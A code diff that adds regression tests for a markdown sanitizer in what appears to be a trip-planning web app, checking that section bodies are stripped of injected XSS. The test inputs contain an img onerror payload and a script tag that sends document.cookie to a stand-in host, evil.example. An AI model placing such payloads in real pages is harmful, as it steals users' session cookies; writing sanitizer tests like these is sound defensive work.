@@ -22,6 +22,28 @@ describe('renderMarkdown — XSS stripping', () => {
   });
 });
 
+// Regression: trip-detail and share pages previously rendered section bodies
+// with bare marked.parse() directly into {@html}, bypassing sanitization.
+// These tests guard against that class of XSS (issue #219).
+describe('renderMarkdown — section-body XSS regression (#219)', () => {
+  it('strips onerror= from an img injected inside a route.md section body', () => {
+    const sectionBody = '## Route highlights\n\nDrive through the park.\n\n<img src=x onerror="alert(1)">\n\nMore text.';
+    const result = renderMarkdown(sectionBody);
+    expect(result).not.toContain('onerror');
+    expect(result).not.toContain('alert');
+    expect(result).toContain('Route highlights');
+    expect(result).toContain('Drive through the park.');
+  });
+
+  it('strips <script> injected inside a shared section body', () => {
+    const sectionBody = 'Day 1: depart early.\n\n<script>fetch("https://evil.example/steal?c="+document.cookie)</script>\n\nDay 2: arrive.';
+    const result = renderMarkdown(sectionBody);
+    expect(result).not.toContain('<script');
+    expect(result).not.toContain('document.cookie');
+    expect(result).toContain('Day 1');
+  });
+});
+
 describe('renderMarkdown — normal markdown preserved', () => {
   it('renders headings', () => {
     const result = renderMarkdown('# Hello\n\n## World');
